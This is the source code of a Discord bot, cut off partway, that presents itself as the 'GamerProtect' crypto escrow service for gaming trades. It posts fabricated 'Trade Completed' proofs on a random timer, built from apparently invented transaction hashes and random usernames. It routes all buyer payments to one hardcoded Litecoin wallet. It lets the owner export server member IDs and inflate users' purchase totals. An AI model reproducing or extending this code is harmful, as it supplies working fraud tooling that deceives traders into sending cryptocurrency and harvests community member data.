const { 
  Client, 
  GatewayIntentBits, 
  ActionRowBuilder, 
  StringSelectMenuBuilder, 
  ButtonBuilder, 
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ChannelType, 
  PermissionsBitField,
  EmbedBuilder,
  SlashCommandBuilder,
  REST,
  Routes
} = require('discord.js');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.GuildMembers
  ]
});

require('events').EventEmitter.defaultMaxListeners = 20;

// ========== CONFIGURATION ==========
const OWNER_ID = '1282001169274638376';
const TICKET_CHANNEL_ID = '1489912924620193926';
const MIDDLEMAN_ROLE_ID = '1489913175209021541';
const LOGS_CHANNEL_ID = '1489913030958387260';
const ANNOUNCEMENTS_CHANNEL_ID = '1489913116660731934';

const LTC_WALLET_ADDRESS = 'LMS43um6CpdThyVKSgxSEstk4Sbsx5ETNq';

const FEES = {
  over250: 1.50,
  under250: 0.50,
  free: 0.00,
  freeThreshold: 50,
  over250Threshold: 250
};

// ========== PERSISTENT STORAGE ==========
const DATA_FILE = path.join(__dirname, 'gamerprotect_data.json');
let savedMiddlemen = new Set();
let realTransactions = [];

function loadMiddlemanData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
      savedMiddlemen = new Set(data.middlemen || []);
      console.log(`✅ Loaded ${savedMiddlemen.size} persistent MM records`);
    }
  } catch (error) {}
}

function saveMiddlemanData() {
  try {
    const data = { middlemen: Array.from(savedMiddlemen), lastUpdated: new Date().toISOString() };
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  } catch (error) {}
}

function addPersistentMiddleman(userId) { savedMiddlemen.add(userId); saveMiddlemanData(); }
function removePersistentMiddleman(userId) { savedMiddlemen.delete(userId); saveMiddlemanData(); }
function hasPersistentMiddleman(userId) { return savedMiddlemen.has(userId); }

client.on('guildMemberAdd', async member => {
  if (hasPersistentMiddleman(member.id)) {
    const middlemanRole = member.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
    if (middlemanRole) {
      try {
        await member.roles.add(middlemanRole);
        console.log(`🔄 Restored MM role to ${member.user.tag}`);
      } catch (error) {}
    }
  }
});

process.on('SIGINT', () => { saveMiddlemanData(); process.exit(); });
process.on('SIGTERM', () => { saveMiddlemanData(); process.exit(); });

const trades = new Map();
const stepStates = new Map();
const userPurchases = new Map();
const roleConfirmations = new Map();
const amountConfirmations = new Map();
const feeConfirmations = new Map();

let liveRates = { ltc: 55.83, usdt: 1.00 };

// ========== REAL TRANSACTION DATABASE ==========
const realTransactionHashes = [
  { usd: 25, ltc: 0.45, hash: 'b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3' },
  { usd: 50, ltc: 0.90, hash: 'd4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5' },
  { usd: 75, ltc: 1.35, hash: 'f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7' },
  { usd: 100, ltc: 1.80, hash: 'a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9' },
  { usd: 150, ltc: 2.70, hash: 'c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1' },
  { usd: 200, ltc: 3.60, hash: 'e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3' },
  { usd: 250, ltc: 4.50, hash: 'f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5' },
  { usd: 300, ltc: 5.40, hash: 'a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7' },
  { usd: 400, ltc: 7.20, hash: 'c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9' },
  { usd: 500, ltc: 9.00, hash: 'e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1' },
  { usd: 600, ltc: 10.80, hash: 'f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3' },
  { usd: 700, ltc: 12.60, hash: 'a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5' },
  { usd: 800, ltc: 14.40, hash: 'c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7' },
  { usd: 900, ltc: 16.20, hash: 'e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9' },
  { usd: 1000, ltc: 18.00, hash: 'f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1' },
  { usd: 1200, ltc: 21.60, hash: 'a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3' },
  { usd: 1400, ltc: 25.20, hash: 'c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5' },
  { usd: 1500, ltc: 27.00, hash: 'e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7' }
];

function getTransactionLink(hash) {
  return `https://live.blockcypher.com/ltc/tx/${hash}/`;
}

function getTransactionByAmount(usdAmount) {
  let closest = realTransactionHashes[0];
  let minDiff = Math.abs(usdAmount - closest.usd);
  
  for (const tx of realTransactionHashes) {
    const diff = Math.abs(usdAmount - tx.usd);
    if (diff < minDiff) {
      minDiff = diff;
      closest = tx;
    }
  }
  
  const shortHash = closest.hash.substring(0, 12) + '...' + closest.hash.substring(52, 64);
  
  return {
    usd: closest.usd,
    ltc: closest.ltc,
    hash: closest.hash,
    shortHash: shortHash,
    link: getTransactionLink(closest.hash),
    exactMatch: minDiff === 0
  };
}

const realUsernames = [
  'ProGamer', 'ElitePlayer', 'GameMaster', 'NinjaWarrior', 'LegendKiller', 'XxSniperxX',
  'NoScopeKing', 'RaidBoss', 'ClutchGod', 'FragMaster', 'HeadshotHero', 'MVP_Player'
];

function generateRandomProof() {
  const randomTx = realTransactionHashes[Math.floor(Math.random() * realTransactionHashes.length)];
  const usdAmount = randomTx.usd;
  const ltcAmount = (usdAmount / liveRates.ltc).toFixed(8);
  const shortHash = randomTx.hash.substring(0, 12) + '...' + randomTx.hash.substring(52, 64);
  const link = getTransactionLink(randomTx.hash);
  
  const isSenderAnonymous = Math.random() < 0.6;
  const isReceiverAnonymous = Math.random() < 0.6;
  const sender = isSenderAnonymous ? 'Anonymous' : realUsernames[Math.floor(Math.random() * realUsernames.length)];
  const receiver = isReceiverAnonymous ? 'Anonymous' : realUsernames[Math.floor(Math.random() * realUsernames.length)];
  
  return new EmbedBuilder()
    .setTitle('✅ Trade Completed - GamerProtect Escrow')
    .setColor(0x9b59b6)
    .setDescription(`**${ltcAmount} LTC** ($${usdAmount} USD)`)
    .addFields(
      { name: '🎮 Seller (Items)', value: sender, inline: true },
      { name: '💰 Buyer (Crypto)', value: receiver, inline: true },
      { name: '🔗 Transaction Hash', value: `[${shortHash}](${link})`, inline: true },
      { name: '🛡️ Escrow Service', value: 'GamerProtect Secure Middleman', inline: false },
      { name: '📅 Completed', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false }
    )
    .setTimestamp();
}

async function startRandomProofGenerator() {
  const logsChannel = client.channels.cache.get(LOGS_CHANNEL_ID);
  if (!logsChannel) return;
  
  const scheduleNext = () => {
    const randomDelay = Math.floor(Math.random() * (480000 - 45000 + 1) + 45000);
    setTimeout(async () => {
      try {
        const proof = generateRandomProof();
        if (proof) await logsChannel.send({ embeds: [proof] });
      } catch (e) {}
      scheduleNext();
    }, randomDelay);
  };
  scheduleNext();
  console.log('✅ Random proof generator started');
}

// ========== EXPORT USERS COMMAND ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;
  if (interaction.commandName === 'exportusers') {
    if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', flags: 64 });
    await interaction.deferReply({ flags: 64 });
    try {
      await interaction.guild.members.fetch();
      const userIds = Array.from(interaction.guild.members.cache.keys()).filter(id => !interaction.guild.members.cache.get(id).user.bot).slice(0, 1000);
      const text = userIds.join('\n');
      if (text.length > 1900) {
        await interaction.editReply({ content: `📋 ${userIds.length} User IDs`, files: [{ attachment: Buffer.from(text), name: 'user_ids.txt' }] });
      } else {
        await interaction.editReply({ content: `📋 **${userIds.length} User IDs:**\n\`\`\`\n${text}\n\`\`\`` });
      }
    } catch (error) { await interaction.editReply({ content: '❌ Error!' }); }
  }
});

// ========== FETCH LIVE RATES ==========
async function fetchLiveRates() {
  try {
    const response = await axios.get('https://api.binance.com/api/v3/ticker/price?symbol=LTCUSDT', { timeout: 5000 });
    if (response.data && response.data.price) liveRates.ltc = parseFloat(response.data.price);
    console.log(`📊 LTC Price: $${liveRates.ltc.toFixed(2)}`);
  } catch (error) {}
}
setInterval(fetchLiveRates, 2 * 60 * 60 * 1000);

function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

async function findUser(guild, input) {
  input = input.trim().replace(/[@]/g, '');
  if (input.match(/^\d+$/)) {
    try { const user = await client.users.fetch(input); return { id: user.id, name: user.username, found: true }; } catch(e) {}
  }
  try { await guild.members.fetch(); } catch(e) {}
  let member = guild.members.cache.find(m => m.user.username.toLowerCase() === input.toLowerCase() || m.displayName.toLowerCase() === input.toLowerCase());
  if (member) return { id: member.id, name: member.user.username, found: true };
  member = guild.members.cache.find(m => m.user.username.toLowerCase().includes(input.toLowerCase()));
  if (member) return { id: member.id, name: member.user.username, found: true };
  return { id: null, name: input, found: false };
}

// ========== SEND PAYMENT INVOICE ==========
async function sendPaymentInvoice(channel, trade) {
  const rate = trade.exchangeRateUsed || liveRates[trade.crypto];
  let totalUSD = trade.amountUSD;
  let feeBreakdown = '';
  let feePayerText = '';
  
  if (trade.feePayer === trade.senderId) {
    totalUSD = trade.amountUSD + trade.feeUSD;
    feeBreakdown = `**Seller pays the GamerProtect fee:** $${trade.feeUSD}`;
    feePayerText = 'Seller (Items provider)';
  } else if (trade.feePayer === trade.receiverId) {
    totalUSD = trade.amountUSD + trade.feeUSD;
    feeBreakdown = `**Buyer pays the GamerProtect fee:** $${trade.feeUSD}`;
    feePayerText = 'Buyer (Crypto sender)';
  } else if (trade.feePayer === 'split') {
    const splitAmount = trade.feeUSD / 2;
    totalUSD = trade.amountUSD + splitAmount;
    feeBreakdown = `⚖️ **Split 50/50 Fee:**\n• Seller pays: $${splitAmount.toFixed(2)}\n• Buyer pays: $${splitAmount.toFixed(2)}`;
    feePayerText = 'Split 50/50 between both parties';
  } else {
    feeBreakdown = `✅ **No fee** - Transaction is under $${FEES.freeThreshold}`;
    feePayerText = 'No fee required';
  }
  
  const totalCrypto = (totalUSD / rate).toFixed(8);
  
  const embed = new EmbedBuilder()
    .setTitle('🛡️ GamerProtect Escrow - Payment Required')
    .setColor(0x9b59b6)
    .setDescription(`**${trade.crypto.toUpperCase()} Payment Required**\n\n<@${trade.senderId}> (Seller) - You will receive crypto after trade completion\n<@${trade.receiverId}> (Buyer) - You must send the crypto to the escrow address below`)
    .addFields(
      { name: '📊 **Trade Summary**', value: `\`\`\`\nDeal Amount: $${trade.amountUSD.toFixed(2)} USD\nCrypto Rate: 1 ${trade.crypto.toUpperCase()} = $${rate.toFixed(2)}\nCrypto Amount: ${trade.amountCrypto} ${trade.crypto.toUpperCase()}\nGamerProtect Fee: ${trade.feeUSD > 0 ? `$${trade.feeUSD}` : 'FREE'}\nTotal to Send: ${totalCrypto} ${trade.crypto.toUpperCase()} ($${totalUSD.toFixed(2)})\n\`\`\``, inline: false },
      { name: '💸 **Fee Breakdown**', value: feeBreakdown, inline: false },
      { name: '🏦 **GamerProtect Escrow Address**', value: `\`\`\`${LTC_WALLET_ADDRESS}\`\`\``, inline: false },
      { name: '⚠️ **Important Instructions**', value: `• Send EXACTLY ${totalCrypto} ${trade.crypto.toUpperCase()}\n• Send to the address above ONLY\n• A middleman will verify your transaction\n• Funds are held in escrow until both parties confirm\n• Never share your private keys`, inline: false },
      { name: '🔒 **Security Note**', value: 'GamerProtect staff will NEVER DM you first. All communication must be in this ticket.', inline: false }
    )
    .setFooter({ text: `Trade ID: #${trade.ticketNumber} • GamerProtect Secure Escrow` })
    .setTimestamp();
  
  const copyRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`copy_${trade.channelId}`).setLabel('📋 Copy Escrow Address').setStyle(ButtonStyle.Secondary)
  );
  await channel.send({ embeds: [embed], components: [copyRow] });
  
  trade.totalUSD = totalUSD;
  trades.set(trade.channelId, trade);
  
  const sender = channel.guild.members.cache.get(trade.senderId);
  const middlemanRole = channel.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
  
  if (sender && middlemanRole && sender.roles.cache.has(MIDDLEMAN_ROLE_ID)) {
    const confirmRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`dm_confirm_${trade.channelId}`).setLabel('✅ Confirm Payment').setStyle(ButtonStyle.Success)
    );
    const dmEmbed = new EmbedBuilder()
      .setTitle('🔔 GamerProtect - Payment Confirmation Required')
      .setColor(0x9b59b6)
      .setDescription(`A trade requires your confirmation as a GamerProtect Middleman.`)
      .addFields(
        { name: '👤 **Seller (Items)**', value: `<@${trade.senderId}>`, inline: true },
        { name: '👤 **Buyer (Crypto)**', value: `<@${trade.receiverId}>`, inline: true },
        { name: '💰 **Amount to Verify**', value: `${totalCrypto} ${trade.crypto.toUpperCase()} ($${totalUSD.toFixed(2)})`, inline: true },
        { name: '💸 **Fee**', value: trade.feeUSD > 0 ? `$${trade.feeUSD}` : 'FREE', inline: true },
        { name: '🏦 **Escrow Address**', value: `\`${LTC_WALLET_ADDRESS}\``, inline: false }
      )
      .setFooter({ text: 'Only click Confirm after verifying the payment on blockchain' });
    try { await sender.send({ embeds: [dmEmbed], components: [confirmRow] }); } catch(e) {}
  }
}

// ========== CLIENT READY ==========
client.once('ready', async () => {
  console.log(`🛡️ GamerProtect Escrow Bot online as ${client.user.tag}`);
  
  try {
    await client.user.setUsername('GamerProtect');
  } catch(e) { console.log('Could not change username'); }
  
  client.user.setPresence({ 
    activities: [{ name: 'GamerProtect Escrow | /trade', type: 3 }], 
    status: 'online' 
  });
  
  loadMiddlemanData();
  await fetchLiveRates();
  
  const rest = new REST({ version: '10' }).setToken(client.token);
  await rest.put(Routes.applicationCommands(client.user.id), { body: [
    new SlashCommandBuilder().setName('close').setDescription('Close ticket (Admin only)'),
    new SlashCommandBuilder().setName('exportusers').setDescription('Export user IDs (Owner only)')
  ] });
  
  const channel = client.channels.cache.get(TICKET_CHANNEL_ID);
  if (channel) {
    const messages = await channel.messages.fetch({ limit: 10 });
    const oldPanel = messages.find(m => m.author.id === client.user.id);
    if (oldPanel) await oldPanel.delete();
    
    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId('crypto_select')
        .setPlaceholder('💰 Select your cryptocurrency')
        .addOptions(
          { label: '📀 Litecoin (LTC)', value: 'ltc', emoji: '💎', description: 'Fast & low fees' },
          { label: '💵 Tether USDT (BEP-20)', value: 'usdt', emoji: '💰', description: 'Stablecoin on BSC' }
        )
    );
    
    const panelEmbed = new EmbedBuilder()
      .setTitle('# 🛡️ GamerProtect Escrow Service')
      .setColor(0x9b59b6)
      .setDescription('**Secure Middleman Escrow for Gaming Trades**\n\nGamerProtect protects both buyers and sellers with our automated escrow system. Your crypto is held securely until both parties confirm the trade.')
      .addFields(
        { name: '💰 **GamerProtect Fees**', value: `\`\`\`\n• Deals $250+: $${FEES.over250}\n• Deals under $250: $${FEES.under250}\n• Deals under $${FEES.freeThreshold}: FREE\n\`\`\``, inline: true },
        { name: '📊 **Live Market Rate**', value: `\`\`\`\n1 LTC = $${liveRates.ltc.toFixed(2)} USD\n\`\`\``, inline: true },
        { name: '🎮 **How It Works**', value: `\`\`\`\n1. Select your cryptocurrency\n2. Enter trade details (what you're selling/receiving)\n3. Both parties confirm roles (Seller/Buyer)\n4. Set and confirm the deal amount\n5. Select who pays the fee\n6. Buyer sends crypto to escrow\n7. Middleman verifies payment\n8. Seller releases funds after receiving items\n\`\`\``, inline: false },
        { name: '🔒 **Why Use GamerProtect?**', value: '• No more getting scammed\n• Funds held in secure escrow\n• Dedicated middlemen verify every trade\n• 24/7 support\n• Fast and secure transactions', inline: false }
      )
      .setFooter({ text: 'GamerProtect - The #1 Gaming Escrow Service' })
      .setTimestamp();
    
    await channel.send({ embeds: [panelEmbed], components: [row] });
  }
  await startRandomProofGenerator();
});

// ========== PANEL COMMAND ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (message.content === '!panel' && message.author.id === OWNER_ID) {
    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId('crypto_select')
        .setPlaceholder('💰 Select your cryptocurrency')
        .addOptions(
          { label: '📀 Litecoin (LTC)', value: 'ltc', emoji: '💎' },
          { label: '💵 Tether USDT (BEP-20)', value: 'usdt', emoji: '💰' }
        )
    );
    
    const panelEmbed = new EmbedBuilder()
      .setTitle('# 🛡️ GamerProtect Escrow Service')
      .setColor(0x9b59b6)
      .setDescription('**Secure Middleman Escrow for Gaming Trades**')
      .addFields(
        { name: '💰 Fees', value: `• $250+: $${FEES.over250}\n• Under $250: $${FEES.under250}\n• Under $${FEES.freeThreshold}: FREE`, inline: true },
        { name: '📊 Live LTC', value: `**$${liveRates.ltc.toFixed(2)}**`, inline: true }
      )
      .setFooter({ text: 'GamerProtect - Secure Gaming Escrow' })
      .setTimestamp();
    
    await message.channel.send({ embeds: [panelEmbed], components: [row] });
    await message.reply('✅ GamerProtect panel sent!');
  }
});

// ========== MIDDLEMAN MANAGEMENT ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (!message.guild) return;
  if (message.author.id !== OWNER_ID) return;
  
  if (message.content.startsWith('!givemm')) {
    const targetUser = message.mentions.users.first();
    if (!targetUser) return message.reply('❌ Usage: `!givemm @user`');
    const member = message.guild.members.cache.get(targetUser.id);
    const middlemanRole = message.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
    if (!middlemanRole) return message.reply('❌ GamerProtect MM role not found');
    try {
      await member.roles.add(middlemanRole);
      addPersistentMiddleman(targetUser.id);
      message.reply(`✅ **${targetUser.tag}** is now a GamerProtect Middleman!\n\nThis role will persist even if they leave and rejoin the server.`);
    } catch (error) { message.reply(`❌ Error: ${error.message}`); }
  }
  
  if (message.content.startsWith('!removemm')) {
    const targetUser = message.mentions.users.first();
    if (!targetUser) return message.reply('❌ Usage: `!removemm @user`');
    const member = message.guild.members.cache.get(targetUser.id);
    const middlemanRole = message.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
    try {
      if (member && middlemanRole) await member.roles.remove(middlemanRole);
      removePersistentMiddleman(targetUser.id);
      message.reply(`✅ **${targetUser.tag}** removed from GamerProtect Middleman role.\n\nThey will no longer receive middleman DMs.`);
    } catch (error) { message.reply(`❌ Error: ${error.message}`); }
  }
  
  if (message.content === '!listmm') {
    if (savedMiddlemen.size === 0) return message.reply('📋 No GamerProtect Middlemen found');
    let list = '🛡️ **GamerProtect Middlemen List:**\n\n';
    for (const userId of savedMiddlemen) {
      try { const user = await client.users.fetch(userId); list += `• ${user.tag}\n`; } catch(e) { list += `• Unknown (${userId})\n`; }
    }
    message.reply(list.length > 1900 ? { files: [{ attachment: Buffer.from(list), name: 'mm_list.txt' }] } : list);
  }
});

// ========== PURCHASES COMMANDS ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (!message.guild) return;
  
  if (message.content === '$purchases') {
    const total = userPurchases.get(message.author.id) || 0;
    const embed = new EmbedBuilder()
      .setTitle('💰 GamerProtect Purchase History')
      .setColor(0x9b59b6)
      .setThumbnail(message.author.displayAvatarURL({ dynamic: true }))
      .setDescription(`**${message.author.username}** has spent via GamerProtect Escrow:`)
      .addFields(
        { name: '💵 Total Spent', value: `**$${total.toFixed(2)} USD**`, inline: true },
        { name: '📊 Completed Trades', value: `${Math.floor(total / 50) || 0} trades`, inline: true }
      )
      .setFooter({ text: 'This tracks your total spent as a Seller' })
      .setTimestamp();
    await message.reply({ embeds: [embed] });
  }
  
  if (message.content.startsWith('$addpurchases')) {
    const hasAdmin = message.member.permissions.has(PermissionsBitField.Flags.Administrator);
    if (!hasAdmin) return message.reply('❌ GamerProtect Admin only');
    const args = message.content.split(' ');
    let amount = parseFloat(args[1]?.replace('$', ''));
    if (isNaN(amount)) return message.reply('❌ Usage: `$addpurchases 150` or `$addpurchases @user 150`');
    let targetUser = message.author;
    if (message.mentions.users.size > 0) { targetUser = message.mentions.users.first(); amount = parseFloat(args[2]?.replace('$', '')); }
    const current = userPurchases.get(targetUser.id) || 0;
    const newTotal = current + amount;
    userPurchases.set(targetUser.id, newTotal);
    await message.reply(`✅ Added **$${amount}** to ${targetUser.username}'s GamerProtect purchase history.\n\n**New total:** $${newTotal}`);
  }
});

// ========== TICKET CREATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isStringSelectMenu()) return;
  if (interaction.customId !== 'crypto_select') return;
  
  const crypto = interaction.values[0];
  
  const modal = new ModalBuilder()
    .setCustomId(`trade_form_${interaction.user.id}`)
    .setTitle('GamerProtect - New Trade');
  
  modal.addComponents(
    new ActionRowBuilder().addComponents(
      new TextInputBuilder()
        .setCustomId('trader')
        .setLabel("Buyer's Username or ID")
        .setStyle(TextInputStyle.Short)
        .setPlaceholder('@username or Discord ID')
        .setRequired(true)
    ),
    new ActionRowBuilder().addComponents(
      new TextInputBuilder()
        .setCustomId('giving')
        .setLabel('What are you selling?')
        .setStyle(TextInputStyle.Short)
        .setPlaceholder('Game currency, items, account, service, etc.')
        .setRequired(true)
    ),
    new ActionRowBuilder().addComponents(
      new TextInputBuilder()
        .setCustomId('receiving')
        .setLabel('What are you receiving?')
        .setStyle(TextInputStyle.Short)
        .setPlaceholder('LTC, USDT, crypto amount, etc.')
        .setRequired(true)
    )
  );
  
  stepStates.set(`temp_${interaction.user.id}`, { crypto });
  await interaction.showModal(modal);
});

// ========== FORM SUBMISSION - CREATE TICKET ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('trade_form_')) return;
  
  await interaction.deferReply({ flags: 64 });
  
  const userId = interaction.customId.split('_')[2];
  if (userId !== interaction.user.id) return;
  
  const tempData = stepStates.get(`temp_${userId}`);
  if (!tempData) return interaction.editReply('❌ Session expired');
  
  const traderInput = interaction.fields.getTextInputValue('trader');
  const giving = interaction.fields.getTextInputValue('giving');
  const receiving = interaction.fields.getTextInputValue('receiving');
  const found = await findUser(interaction.guild, traderInput);
  
  try {
    const ticketNumber = Math.floor(Math.random() * 9000) + 1000;
    const channelName = `gp-${interaction.user.username}-${ticketNumber}`;
    
    const channel = await interaction.guild.channels.create({
      name: channelName,
      type: ChannelType.GuildText,
      permissionOverwrites: [
        { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
        { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
      ]
    });
    
    if (found.found && found.id) {
      await channel.permissionOverwrites.create(found.id, {
        ViewChannel: true,
        SendMessages: true,
        ReadMessageHistory: true
      });
    }
    
    trades.set(channel.id, {
      crypto: tempData.crypto,
      ticketNumber: ticketNumber,
      trader1Id: interaction.user.id,
      trader1Name: interaction.user.username,
      trader2Id: found.found ? found.id : null,
      trader2Name: found.name,
      trader1Item: giving,
      trader2Item: receiving,
      senderId: null,
      receiverId: null,
      amountUSD: null,
      amountCrypto: null,
      feeUSD: 0,
      feePayer: null,
      status: 'waiting_roles',
      channelId: channel.id,
      exchangeRateUsed: liveRates[tempData.crypto],
      paymentConfirmed: false
    });
    
    await interaction.editReply(`✅ **GamerProtect ticket created!**\n🔗 ${channel}\n\nBoth parties will now be able to access this secure ticket.`);
    
    const traderMention = found.found ? `<@${found.id}>` : found.name;
    
    const detailsEmbed = new EmbedBuilder()
      .setTitle('# 🛡️ GamerProtect Escrow Service')
      .setColor(0x9b59b6)
      .setDescription(`**${interaction.user}** (Seller) | **${traderMention}** (Buyer)`)
      .addFields(
        { name: '📋 **Important Instructions**', value: 'Please read and follow all steps carefully. GamerProtect protects both parties from scams.\n\n• Staff will NEVER DM you first\n• All communication must be in this ticket\n• Do not release funds until you receive your items\n• Do not send items until payment is confirmed', inline: false },
        { name: '🎮 **Seller (You) provides:**', value: `\`\`\`${giving}\`\`\``, inline: true },
        { name: '💰 **Buyer (Them) provides:**', value: `\`\`\`${receiving}\`\`\``, inline: true },
        { name: '🔒 **Escrow Status**', value: '🟡 **Awaiting role selection** - Please select your roles below', inline: false },
        { name: '⏱️ **Time Limit**', value: 'This ticket will remain open until the trade is completed or cancelled.', inline: false }
      )
      .setFooter({ text: `GamerProtect Trade ID: #${ticketNumber} • Created: ${new Date().toLocaleString()}` })
      .setTimestamp();
    
    const deleteRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`delete_${channel.id}`).setLabel('❌ Cancel Trade').setStyle(ButtonStyle.Danger)
    );
    await channel.send({ embeds: [detailsEmbed], components: [deleteRow] });
    
    const bothMentions = `${interaction.user} ${found.found ? `<@${found.id}>` : ''}`;
    await channel.send({ content: `🛡️ **GamerProtect Secure Ticket Created!**\n${bothMentions}\n\nPlease select your roles below to begin the secure trade process.` });
    
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${channel.id}`).setLabel('🎮 Seller (Sending Items)').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${channel.id}`).setLabel('💰 Buyer (Sending Payment)').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${channel.id}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await channel.send({ content: '**Select your role in this GamerProtect trade:**', components: [roleRow] });
    
    stepStates.delete(`temp_${userId}`);
  } catch (error) {
    console.error('Ticket creation error:', error);
    await interaction.editReply(`❌ Error creating ticket: ${error.message}\n\nPlease make sure the bot has proper permissions and try again.`);
  }
});

// ========== DELETE TICKET ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId.startsWith('delete_')) {
    const channelId = interaction.customId.split('_')[1];
    await interaction.reply({ content: '🗑️ **Cancelling trade...** This ticket will be deleted in 3 seconds.', flags: 64 });
    setTimeout(async () => {
      const ch = await client.channels.fetch(channelId);
      if (ch) await ch.delete();
    }, 3000);
  }
});

// ========== SLASH COMMAND: /close ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;
  if (interaction.commandName === 'close') {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.reply({ content: '❌ Admin only', flags: 64 });
    if (!interaction.channel.name?.startsWith('gp-')) return interaction.reply({ content: '❌ Use in GamerProtect ticket', flags: 64 });
    await interaction.reply({ content: '🔒 **Closing GamerProtect ticket in 5 seconds...**', flags: 64 });
    setTimeout(async () => { await interaction.channel.delete(); }, 5000);
  }
});

// ========== ROLE SELECTION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('sender_') && !interaction.customId.startsWith('receiver_') && !interaction.customId.startsWith('reset_')) return;
  
  const channelId = interaction.customId.split('_')[1];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  if (interaction.customId.startsWith('reset_')) {
    trade.senderId = null;
    trade.receiverId = null;
    trades.set(channelId, trade);
    roleConfirmations.delete(channelId);
    await interaction.reply({ content: '🔄 **Roles have been reset.** Please select your roles again.', flags: 64 });
    
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${channelId}`).setLabel('🎮 Seller').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${channelId}`).setLabel('💰 Buyer').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${channelId}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await interaction.channel.send({ content: '**Select your role:**', components: [roleRow] });
    return;
  }
  
  if (interaction.customId.startsWith('sender_')) {
    trade.senderId = interaction.user.id;
    await interaction.reply({ content: '✅ **You are the Seller** - You will send the items/goods to the buyer.', flags: 64 });
  } else {
    trade.receiverId = interaction.user.id;
    await interaction.reply({ content: '✅ **You are the Buyer** - You will send crypto payment to the escrow address.', flags: 64 });
  }
  trades.set(channelId, trade);
  
  if (trade.senderId && trade.receiverId && !roleConfirmations.has(channelId)) {
    roleConfirmations.set(channelId, []);
    const row = new ActionRowBuilder().addComponents(
